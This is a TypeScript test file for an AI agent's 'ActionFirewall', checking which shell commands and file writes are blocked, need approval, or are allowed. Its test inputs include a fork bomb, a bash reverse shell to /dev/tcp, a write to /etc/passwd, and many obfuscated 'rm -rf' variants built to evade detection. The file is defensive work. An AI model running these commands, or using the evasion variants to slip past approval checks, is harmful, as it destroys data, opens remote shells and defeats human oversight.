import { describe, expect, it } from "vitest";
import {
	type ActionApprovalContext,
	ActionFirewall,
	defaultActionFirewall,
} from "../../src/safety/action-firewall.js";

function makeWriteContext(path: string): ActionApprovalContext {
	return { toolName: "write", args: { path } };
}

function makeBashContext(command: string): ActionApprovalContext {
	return { toolName: "bash", args: { command } };
}

describe("ActionFirewall - Blocking Rules", () => {
	it("blocks modification of critical system directories", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeWriteContext("/etc/passwd"),
		);
		expect(verdict.action).toBe("block");
		expect(verdict).toMatchObject({
			ruleId: "system-path-protection",
		});
		expect(verdict.remediation).toContain("workspace directory");
	});

	if (process.platform === "win32") {
		it("blocks modification of critical system directories (windows style)", async () => {
			const verdict = await defaultActionFirewall.evaluate(
				makeWriteContext("C:\\Windows\\System32\\drivers\\etc\\hosts"),
			);
			expect(verdict.action).toBe("block");
			expect(verdict).toMatchObject({
				ruleId: "system-path-protection",
			});
		});
	}

	it("requires approval for dangerous patterns (fork bomb)", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext(":(){ :|:& };:"),
		);
		expect(verdict.action).toBe("require_approval");
		expect(verdict).toMatchObject({
			ruleId: "command-forkBomb",
		});
	});

	it("requires approval for dangerous patterns (reverse shell)", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"),
		);
		expect(verdict.action).toBe("require_approval");
		// Matches bashReverse first
		expect(verdict).toMatchObject({
			ruleId: "command-bashReverse",
		});
	});

	it("requires approval via legacy match/reason rules (plan mode)", async () => {
		const originalPlanMode = process.env.COMPOSER_PLAN_MODE;
		process.env.COMPOSER_PLAN_MODE = "1";
		try {
			const verdict = await defaultActionFirewall.evaluate(
				makeBashContext("echo ok"),
			);
			expect(verdict.action).toBe("require_approval");
			expect(verdict.ruleId).toBe("plan-mode-confirm");
			expect(verdict.reason).toContain("Plan mode requires confirmation");
		} finally {
			process.env.COMPOSER_PLAN_MODE = originalPlanMode;
		}
	});

	it("allows simple bash without risky syntax", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("echo ok"),
		);
		expect(verdict.action).toBe("allow");
	});

	it("requires approval for git push even without --force", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("git push origin main"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for git push with flags before subcommand", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("git -C repo push origin main"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for quoted destructive commands", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext('"rm" -rf /tmp/foo'),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for path-prefixed destructive commands", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("/bin/rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when env assignment precedes destructive command", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("PATH=/evil rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for mixed-separator path-prefixed commands", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("/usr\\bin\\rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when wrapper command invokes destructive command", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("env rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for nested wrapper commands", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("env nice rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for path-prefixed wrapper commands", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("/usr/bin/env rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when wrapper flags consume an argument", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("env -u VARIABLE rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when wrapper flags consume an argument (timeout)", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("timeout -s SIGKILL rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when wrapper boolean flag should not consume next argument", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("timeout --preserve-status rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for exec and eval wrappers", async () => {
		const execVerdict = await defaultActionFirewall.evaluate(
			makeBashContext("exec rm -rf /tmp/foo"),
		);
		const evalVerdict = await defaultActionFirewall.evaluate(
			makeBashContext("eval rm -rf /tmp/foo"),
		);
		expect(execVerdict.action).toBe("require_approval");
		expect(evalVerdict.action).toBe("require_approval");
	});

	it("requires approval when eval receives a quoted command string", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext('eval "rm -rf /tmp/foo"'),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when using builtin command wrapper", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("command rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for git flags with quoted values containing spaces", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext('git -c "user.name=foo bar" push'),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for git push -f", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("git push -f origin main"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("allows read-only git commands through fast path", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("git status"),
		);
		expect(verdict.action).toBe("allow");
	});

	it("requires approval for positional parameter expansion", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("echo $1 | rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("allows benign braces inside quotes", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext('echo "hello {world}"'),
		);
		expect(verdict.action).toBe("allow");
	});

	it("requires approval for indirect exec helpers", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("xargs rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for inline quoted command names", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext('r"m" -rf /tmp/foo'),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when wrapper has duration argument", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("timeout 5 rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when wrapper uses flag with =", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("timeout --signal=KILL rm -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when destructive git flag uses =", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("git --force=push push"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when git subcommand is hidden in flag value", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("git commit --amend=push"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for brace-expanded destructive commands", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("${RM:-rm} -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval for subshell destructive commands", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("( rm -rf /tmp/foo )"),
		);
		expect(verdict.action).toBe("require_approval");
	});

	it("requires approval when command is provided via variable expansion", async () => {
		const verdict = await defaultActionFirewall.evaluate(
			makeBashContext("$RM -rf /tmp/foo"),
		);
		expect(verdict.action).toBe("require_approval");
	});
});
